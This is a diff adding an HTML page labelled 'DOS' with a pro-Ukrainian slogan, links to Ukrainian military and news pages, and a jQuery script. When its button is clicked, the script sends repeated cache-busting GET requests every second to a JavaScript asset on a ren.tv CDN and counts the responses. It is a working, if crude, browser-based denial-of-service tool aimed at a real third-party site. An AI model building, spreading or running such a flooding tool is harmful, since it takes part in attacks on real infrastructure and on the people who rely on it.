@@ -1,0 +1,119 @@
+<meta charset="UTF-8">
+<html>
+    <head>
+        <title>
+            Русский военный корабль, иди нахуй!
+        </title>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+            integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            <script src="./sites.js"></script>
+            <style>
+                .container { 
+  height: 200px;
+  position: relative;
+}
+
+.center {
+  margin: 0;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  -ms-transform: translate(-50%, -50%);
+  transform: translate(-50%, -50%);
+}
+            </style>
+            
+    </head>
+    <body>
+        <div class="container">
+            <div class="center">
+                <title>Русский военный корабль, иди нахуй!</title>
+                <p>DOS</p>
+                <button id="btn">Слава Україні</button>
+                <p id="count"></p>
+            </div>
+
+<br />
+<a href="https://www.facebook.com/GeneralStaff.ua">GeneralStaff.ua</a>
+<br />
+<a href="https://www.facebook.com/UkrainianLandForces">UkrainianLandForce</a>
+<br />
+<a href="https://www.facebook.com/yuri.biriukov">yuri.biriukov</a>
+<br />
+<a href="https://www.facebook.com/zelenskiy.official">zelenskiy.official</a>
+<br />
+<a href="https://www.facebook.com/NationalBankOfUkraine/posts/316243890546264">NationalBankOfUkraine</a>
+<br />
+<a href="https://t.me/ShrikeNews">ShrikeNews</a>
+<br />
+<a href="https://t.me/dumskaya_net">dumskaya TG</a>
+<br />
+<a href="https://dumskaya.net">dumskaya.net</a>
+        </div>
+    </body>
+    <script>
+        const sites = [
+                {
+                    url: "https://cdn.ren.tv/asset/dist/client/ea1684f.js",
+                    method: "GET",
+                },
+            ];
+
+        const btn = document.getElementById("btn");
+        const countP = document.getElementById("count");
+
+        $(document).ready(function () {
+            $.ajaxSetup({ cache: false });
+        });
+
+        btn.addEventListener("click", () => {
+            if (btn.innerText === "Слава Україні") {
+                btn.innerText = "Героям Слава!";
+                start();
+            } else {
+                stop();
+                btn.innerText = "Слава Україні";
+            }
+        });
+        var start_state = false;
+
+        function stop(){
+            start_state = false;
+        }
+
+        function start(){
+            start_state = true;
+        }
+
+    var count_all = 0;
+        var counter = 0;
+
+        setInterval(function () {
+            if(start_state && counter === 0){
+                var s = sites[Math.floor(Math.random() * sites.length)];
+                console.log("ites[s", sites, s)
+                if (s.method === "GET") {
+                    counter++;
+                    $.get(
+                        s.url, {}, function (data) {
+                            count_all++;
+                            countP.innerText = count_all+"";
+                            counter--;
+                        }
+                    );
+                } else {
+                    counter++;
+                    $.post(
+                        s.url, {}, function (data) {
+                            count_all++;
+                            countP.innerText = count_all + "";
+                            counter--;
+                        }
+                    );
+                }
+            }                  
+        }, 1000)
+        
+    </script>
+</html>
